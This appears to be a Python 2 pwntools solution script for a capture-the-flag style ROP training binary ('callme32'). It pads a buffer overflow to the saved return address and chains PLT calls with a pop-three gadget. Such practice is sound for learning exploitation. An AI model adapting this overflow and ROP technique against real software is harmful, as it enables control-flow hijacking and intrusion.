from pwn import *

pop3ret = 0x080488a9 # pop esi ; pop edi ; pop ebp ; ret

callme_one_plt   = 0x080485c0
callme_two_plt   = 0x08048620
callme_three_plt = 0x080485b0

# EIP offset is at 44
rop = "A" * 44

# Call call_me_one(1,2,3)
rop += p32(callme_one_plt)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

# Call call_me_two(1,2,3)
rop += p32(callme_two_plt)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

# Call call_me_three(1,2,3)
rop += p32(callme_three_plt)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

# Start process and send rop chain
e = process('/home/abatchy/Desktop/tmp/callme32')
print e.recv()
e.sendline(rop)

# Print output
print e.recvall()
